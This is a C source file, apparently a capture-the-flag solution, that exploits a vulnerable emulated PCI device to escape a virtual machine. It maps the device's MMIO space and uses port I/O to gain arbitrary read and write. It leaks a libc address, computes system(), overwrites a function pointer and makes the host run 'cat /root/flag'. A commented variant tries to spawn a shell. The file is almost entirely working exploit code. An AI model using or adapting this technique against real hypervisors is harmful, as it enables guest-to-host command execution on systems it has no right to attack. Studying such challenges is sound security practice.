#include <stdio.h>
#include <sys/io.h>
#include <stdint.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>

#define MAP_SIZE 4096

uint8_t *mmio_mem;
uint32_t pmio_base = 0xc050;

char *mmio_path = "/sys/devices/pci0000:00/0000:00:03.0/resource0";

void die(char *msg)
{
    perror(msg);
    exit(-1);
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t *)(mmio_mem + addr));
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)inl(addr);
}

void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, addr);
}

uint32_t arb_read(uint32_t addr)
{
    pmio_write(pmio_base+0, addr);
    return pmio_read(pmio_base+4);
}

void arb_write(uint32_t addr, uint32_t value)
{
    pmio_write(pmio_base+0, addr);
    pmio_write(pmio_base+4, value);
}

int main(int argc, char *argv[])
{
    // change I/O privilege level
    if (iopl(3) != 0)
        die("iopl failed");
    
    // mmap device mmio space
    int fd;
    if ((fd=open(mmio_path, O_RDWR|O_SYNC)) < 0) {
        perror("open device mmio failed");
        exit(-1);
    }
    mmio_mem = mmap(0, MAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED) {
        perror("mmap failed");
        exit(-1);
    }
    
    /*
    $ python3
    >>> from pwn import *
    >>> list(map(hex, unpack_many(b"cat /root/flag  ")))   # string align with 4
    ['0x20746163', '0x6f6f722f', '0x6c662f74', '0x20206761']
    */
    mmio_write(0x8, 0x20746163);
    mmio_write(0xc, 0x6f6f722f);
    mmio_write(0x10, 0x6c662f74);
    mmio_write(0x14, 0x20206761);
    
    // mmio_write(0x8, 0x20006873);    // system("sh"); freeze after print "sh: turning off NDELAY mode"

    uint64_t srand_addr = arb_read(0x108);
    srand_addr = (arb_read(0x104) | (srand_addr<<32));
    uint64_t system_addr = srand_addr + 0xac50;

    arb_write(0x114, system_addr&0xffffffff);

    mmio_write(0xc, 0);
    
    return 0;
}
